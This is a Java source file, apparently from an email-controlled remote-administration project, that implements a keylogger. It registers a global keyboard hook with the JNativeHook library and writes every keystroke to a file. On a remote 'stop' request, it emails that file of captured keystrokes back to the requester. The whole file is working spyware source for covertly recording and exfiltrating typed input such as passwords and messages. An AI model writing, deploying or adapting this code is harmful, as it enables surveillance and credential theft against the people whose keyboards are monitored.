package services;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import server.SendMail;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class KeyLogger implements NativeKeyListener {
    private static final Path file = Paths.get("./src/test/output/keys.txt");
    private static boolean running = false;

    static {
        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE,
                StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
            // Mở và ghi đè file khi lớp được load
        } catch (IOException ex) {
            System.out.println("The file can't be opened or truncated");
            System.exit(-1);
        }
    }

//    public static void main(String[] args) {
//        startKeylogger();
//    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

//        if (keyText.equals("Undefined") || keyText.equals("Unknown")) {
//            keyText = "Key code: " + e.getKeyCode();
//        }

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.APPEND);
             PrintWriter writer = new PrintWriter(os)) {
            if (keyText.length() > 1) {
                writer.print("[" + keyText + "] ");
            } else {
                writer.print(keyText + " ");
            }
        } catch (IOException ex) {
            System.out.println("sai o duoi");
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    public static void startKeylogger(String from) {
        if (!running) {
            try {
                GlobalScreen.registerNativeHook();
            } catch (NativeHookException e) {
                System.out.println("Error in activated hook.");
                System.exit(-1);
            }
            GlobalScreen.addNativeKeyListener(new KeyLogger());
            running = true;
            System.out.println("Keylogger has started...");
        } else {
            System.out.println("Keylogger is running...");
        }
        SendMail.serversendEmail(from, "Reply for request: Start keylogger", "",
                HTMLGenerator.generateHTML("Your request has been completed successfully!", "",
                        "<b>Key logger has started</b>"));
    }

    public static void stopKeylogger(String from) {
        if (running) {
            try {
                GlobalScreen.unregisterNativeHook();
                running = false;
                System.out.println("Keylogger has been stopped.");
            } catch (NativeHookException e) {
                System.out.println("Error when activation hook.");
            }
        } else {
            System.out.println("Keylogger hasn't started yet.");
        }

        SendMail.serversendEmail(from, "Reply for request: Stop keylogger", file.toString(),
                HTMLGenerator.generateHTML("Your request has been completed successfully", "",
                        """
                                 <b>The keylogger has stopped</b>.<br> 
                                 The file below contains the captured keystrokes.
                                """));
    }
}
